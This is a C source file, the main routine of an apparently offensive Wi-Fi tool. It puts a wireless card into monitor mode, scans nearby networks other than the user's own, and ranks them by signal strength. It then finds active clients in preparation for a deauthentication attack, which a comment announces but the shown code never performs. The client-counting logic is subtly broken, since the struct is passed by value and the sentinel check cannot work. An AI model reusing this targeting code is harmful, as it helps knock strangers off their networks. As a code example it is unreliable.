#include <stdio.h>
#include <stdlib.h>
#include "network_scan.h"
#include "network_analysis.h"
#include "utils.h"

int main(int argc, char* argv[])
{
    // Validate arguments
    if (argc < 2 || argc > 3)
    {
        printf("Err: Invalid input\n");
        return -1;
    }

    int result;

    // Initialize wireless interface by placing it into monitor mode
    char* interface_name = argv[1];
    char* my_essid;
    if (argc == 2)
    {
        my_essid = "";
    } 
    else 
    {
        my_essid = argv[2];
    }

    result = initialize_interface(interface_name);
    if (result != 0)
    {
        printf("Err: Failed to initialize interface\n");
        return -1;
    }

    // Perform scan of nearby wireless networks
    result = network_scan(interface_name);
    if (result != 0)
    {
        printf("Err: Failed to perform scan.\n");
        return -1;
    }

    // Parse network capture file to identity valid targets
    int total_networks = 0;
    Network networks[MAX_NETWORKS];
    result = parse_network_capture(networks, &total_networks, my_essid);
    if (result != 0)
    {
        printf("Err: Failed to parse capture file.\n");
        return -1;
    }

    // Sorting the network array by power value - Highest power at the top
    qsort(networks, total_networks, sizeof(Network), compare_by_power);

    int network_count = min(TOP_NETWORKS, total_networks);
    for (int i = 0; i < network_count; i++)
    {
        // Perform targeted scan on each high power network to identify most active client
        result = client_scan(interface_name, networks[i].bssid, networks[i].essid, networks[i].channel);
        if (result != 0)
        {
            printf("Err: Failed to perform scan.\n");
            return -1;
        }
    }

    // Collection of clients - One for each network
    Client clients[network_count];
    int client_count = 0;
    for (int i = 0; i < network_count; i++)
    {
        // Set packets to -5 to have value to check against after attempting to parse into it
        clients[i].packets = -5;
        result = parse_client_capture(clients[i], networks[i].essid, networks[i].bssid);
        if (clients[i].packets != -5)
        {
            client_count++;
        }
    }

    // The deauth attack will take place whether or not we have clients
    // the only difference being how we perform the attack
    int exists_clients = 0;
    if (client_count > 0)
    {
        exists_clients = 1;
    }

    return 0;
}